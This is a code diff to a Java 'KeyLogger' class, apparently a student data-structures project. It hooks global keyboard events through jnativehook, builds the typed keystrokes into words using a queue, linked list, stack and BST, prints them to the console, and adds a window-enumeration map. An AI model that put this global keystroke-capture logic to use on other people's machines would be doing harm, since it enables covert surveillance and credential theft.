@@ -6,15 +6,19 @@ import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
  * VC_A = means virtual code for A in the library
  * raw-code = asci of the chars
  * */
+import java.util.HashMap;
 import java.util.Stack;
 
 public class KeyLogger implements NativeKeyListener {
+    static BalancedBST balancedBST;
     static Queue<Character> queue;
     static LinkedList<String> linkedList;
     static Stack<String> stack;
     static StringBuilder word;
 
+
     KeyLogger() {
+        balancedBST = new BalancedBST();
         queue = new Queue<>();
         linkedList = new LinkedList<>();
         stack = new Stack<>();
@@ -38,7 +42,7 @@ public class KeyLogger implements NativeKeyListener {
 
     // key code is the virtual code assigned to each special key to generate their words counterpart
 
-    public  void startHook() {
+    public void startHook() {
         try {
             GlobalScreen.registerNativeHook();
         } catch (NativeHookException ex) {
@@ -51,7 +55,9 @@ public class KeyLogger implements NativeKeyListener {
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
+        HashMap<Integer, String> map = EnumerateWindows.getHashMap();
         int keyCode = nativeKeyEvent.getKeyCode();
+//        if (MainDriver.focusedLoosed) System.out.println("Focused Loosed");
         // print only when there is a special key
         if (!(keyCode >= 2 && keyCode <= 11 || keyCode >= 16 && keyCode <= 25 || keyCode >= 30 && keyCode <= 38 || keyCode >= 44 && keyCode <= 50)) {
             System.out.println("Key Pressed : " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
@@ -66,7 +72,6 @@ public class KeyLogger implements NativeKeyListener {
             while (!queue.isEmpty()) word.append(queue.remove());
             linkedList.add(word.toString());
             System.out.println("Resultant Linked List : " + linkedList);
-//            writeToFile();
             word.setLength(0);
         }
     }
